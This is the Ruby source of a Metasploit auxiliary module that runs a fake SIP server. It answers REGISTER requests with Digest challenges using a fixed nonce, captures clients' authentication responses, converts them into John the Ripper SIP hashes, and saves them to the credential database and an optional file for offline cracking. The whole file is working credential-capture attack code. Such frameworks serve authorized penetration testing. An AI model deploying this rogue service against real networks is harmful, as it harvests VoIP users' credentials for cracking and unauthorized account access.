##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'English'
require 'rex/socket'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::SocketServer
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name' => 'Authentication Capture: SIP',
      'Description' => %q{
        This module provides a fake SIP service that is designed to
        capture authentication credentials. It captures	challenge and
        response pairs that can be supplied to JtR for cracking.
      },
      'Author' => 'Patrik Karlsson <patrik[at]cqure.net>',
      'License' => MSF_LICENSE,
      'DefaultOptions' => { 'SRVPORT' => 5060 },
      'Actions' => [[ 'Capture', { 'Description' => 'Run SIP capture server' } ]],
      'PassiveActions' => [ 'Capture' ],
      'DefaultAction' => 'Capture',
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [],
        'Reliability' => []
      }
    )

    # This service uses a direct UDP socket, without stream listener overrides.
    deregister_options('SRVSSL', 'ListenerBindAddress', 'ListenerBindPort', 'ListenerComm')
    register_options(
      [
        OptString.new('NONCE', [ true, 'The server byte nonce', '1234' ]),
        OptString.new('JOHNPWFILE', [ false, 'The prefix to the local filename to store the hashes in JOHN format', nil ]),
      ]
    )
    register_advanced_options(
      [
        OptString.new('SRVVERSION', [ true, 'The server version to report in the greeting response', 'ser (3.3.0-pre1 (i386/linux))' ]),
        OptString.new('REALM', [false, 'The SIP realm to which clients authenticate', nil ]),
      ]
    )
  end

  def sip_parse_authorization(data)
    scheme, parameters = data.split(/\s+/, 2)
    return unless scheme&.casecmp?('Digest') && parameters

    kvps = { 'scheme' => scheme }
    parameters.split(/,\s*/).each do |item|
      tokens = item.match(/\A\s*([a-zA-Z][a-zA-Z0-9_-]*)=(?:"([^"]*)"|([^"\s,]+))\s*\z/)
      return nil unless tokens

      key = tokens[1].downcase
      return nil if kvps.key?(key)

      kvps[key] = tokens[2] || tokens[3]
    end
    kvps
  end

  # John reconstructs the signed URI from three fields, including an empty
  # port/suffix when absent. Keep these exact components for MD5 input.
  # https://github.com/openwall/john/blob/37bebbe4b6442c8dd3888e5848ef062c0783e9f3/src/sip_fmt_plug.c
  # @param request [Hash] The captured SIP request and its method.
  # @param tokens [Hash, nil] Parsed Digest Authorization parameters.
  # @param server_ip [String] The capture listener's address.
  # @param client_ip [String] The actual requesting client's address.
  # @return [String, nil] A complete John SIP hash, or nil for unsupported input.
  def sip_digest_hash(request, tokens, server_ip, client_ip)
    required = %w[username realm uri nonce response]
    unless tokens && required.all? { |name| tokens[name].is_a?(String) && !tokens[name].empty? }
      vprint_error('Skipping SIP Digest capture: Missing required authentication fields')
      return
    end

    algorithm = tokens.fetch('algorithm', 'MD5')
    qop = tokens.fetch('qop', '')
    unless algorithm.casecmp?('MD5') && (qop.empty? || qop.casecmp?('auth'))
      vprint_error('Skipping SIP Digest capture: John SIP supports MD5 with no qop or qop=auth')
      return
    end
    unless qop.empty? || (tokens['cnonce'].is_a?(String) && !tokens['cnonce'].empty? && tokens['nc']&.match?(/\A[0-9a-fA-F]{8}\z/))
      vprint_error('Skipping SIP Digest capture: qop=auth requires cnonce and an eight-digit nonce count')
      return
    end

    scheme, resource, suffix = tokens['uri'].split(':', 3)
    unless %w[sip sips].include?(scheme&.downcase) && resource && !resource.empty? && tokens['response'].match?(/\A[0-9a-fA-F]{32}\z/)
      vprint_error('Skipping SIP Digest capture: Invalid signed SIP URI or MD5 response')
      return
    end

    fields = ['$sip$', server_ip, client_ip, tokens['username'], tokens['realm'], request[:method], scheme, resource, suffix.to_s, tokens['nonce'], tokens.fetch('cnonce', ''), tokens.fetch('nc', ''), qop, 'MD5', tokens['response'].downcase]
    # These bounds and delimiters come from the pinned format's valid() contract.
    limits = [nil, 256, 256, 128, 256, 16, nil, nil, nil, 128, 128, 8, 12, 8, 32]
    representable = fields.zip(limits).all? { |value, limit| value.is_a?(String) && !value.match?(/[*:\r\n]/) && (!limit || value.bytesize <= limit) }
    unless representable && [scheme, resource, suffix.to_s].sum(&:bytesize) <= 256
      vprint_error('Skipping SIP Digest capture: Authentication fields exceed the John SIP format')
      return
    end

    fields.join('*')
  end

  def sip_parse_request(data)
    response = {
      headers_raw: [],
      headers: {},
      uri: nil,
      method: nil,
      protocol: nil
    }
    status = data.slice!(0, data.index(/\r?\n/) + 1).split(/\s/)
    response[:method] = status[0]
    response[:uri] = status[1]
    response[:protocol] = status[2]

    while data.index(/\r?\n/)
      header = data.slice!(0, data.index(/\r?\n/) + 1).chomp
      response[:headers_raw] << header
      key, val = header.split(/:\s*/, 2)
      response[:headers][key] = val
    end
    response
  end

  def sip_send_error_message(request, code, msg)
    ip = @requestor[:ip]
    port = @requestor[:port]
    tag = (0...8).map { rand(65..89).chr }.join
    nonce = datastore['NONCE']
    realm = datastore['REALM'] || sip_sanitize_address(ip)
    auth = []

    auth << "SIP/2.0 #{code} #{msg}"
    auth << "Via: #{request[:headers]['Via']};received=#{ip}".gsub('rport', "rport=#{port}")
    auth << "From: #{request[:headers]['From']}"
    auth << "To: #{request[:headers]['To']};tag=#{tag}"
    auth << "Call-ID: #{request[:headers]['Call-ID']}"
    auth << "CSeq: #{request[:headers]['CSeq']}"
    auth << 'Expires: 600'
    auth << 'Min-Expires: 240'
    auth << "WWW-Authenticate: Digest realm=\"#{realm}\", nonce=\"#{nonce}\""
    auth << "Server: #{datastore['SRVVERSION']}"
    auth << 'Content-Length: 0'
    auth << ''

    @sock.sendto(auth.join("\r\n") << "\r\n", @requestor[:ip].to_s, @requestor[:port])
  end

  # removes any leading ipv6 stuff, such as ::ffff: as it breaks JtR
  def sip_sanitize_address(addr)
    if (addr =~ /:/)
      return addr.scan(/.*:(.*)/)[0][0]
    end

    return addr
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'udp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :nonreplayable_hash,
      jtr_format: 'sip'
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def run
    @port = datastore['SRVPORT'].to_i
    @sock = Rex::Socket::Udp.create(
      'LocalHost' => srvhost,
      'LocalPort' => @port,
      'Context' => { 'Msf' => framework, 'MsfExploit' => self }
    )
    @run = true
    server_ip = sip_sanitize_address(srvhost)

    while @run
      res = @sock.timed_recvfrom(65535)
      next unless res

      @requestor = {
        ip: res[1][3],
        port: res[1][1]
      }
      client_ip = sip_sanitize_address(res[1][3])
      next if !res[0] || res[0].empty?

      request = sip_parse_request(res[0])
      method = request[:method]

      case method
      when 'REGISTER'
        authorization = request[:headers]['Authorization'] || request[:headers]['Proxy-Authorization']
        if authorization
          auth_tokens = sip_parse_authorization(authorization)
          hash = sip_digest_hash(request, auth_tokens, server_ip, client_ip)
          unless hash
            sip_send_error_message(request, 401, 'Unauthorized')
            next
          end

          response = auth_tokens['response']
          algorithm = auth_tokens['algorithm'] || 'MD5'
          username = auth_tokens['username']
          proof = "client: #{client_ip}; username: #{username}; nonce: #{auth_tokens['nonce']}; response: #{response}; algorithm: #{algorithm}"
          print_good("SIP LOGIN: #{proof}")

          report_cred(
            ip: @requestor[:ip],
            port: @requestor[:port],
            service_name: 'sip_client',
            user: username,
            password: hash,
            proof: proof
          )

          if datastore['JOHNPWFILE']
            File.open(datastore['JOHNPWFILE'] + '_sip', 'ab') do |file|
              file.puts(username + ':' + hash)
            end
          end

        end
        sip_send_error_message(request, 401, 'Unauthorized')
      when 'ACK'
        # do nothing
      else
        print_error("Unhandled method: #{request[:method]}")
        sip_send_error_message(request, 401, 'Unauthorized')
      end
    end
  rescue ::Interrupt
    raise $ERROR_INFO
  rescue Rex::BindFailed => e
    fail_with(Failure::BadConfig, "Failed to bind SIP listener on #{Rex::Socket.to_authority(srvhost, @port)}: #{e.message}")
  rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionRefused
    nil
  rescue StandardError => e
    print_error("Unknown error: #{e.class} #{e.backtrace}")
  ensure
    @sock&.close
    @sock = nil
  end
end
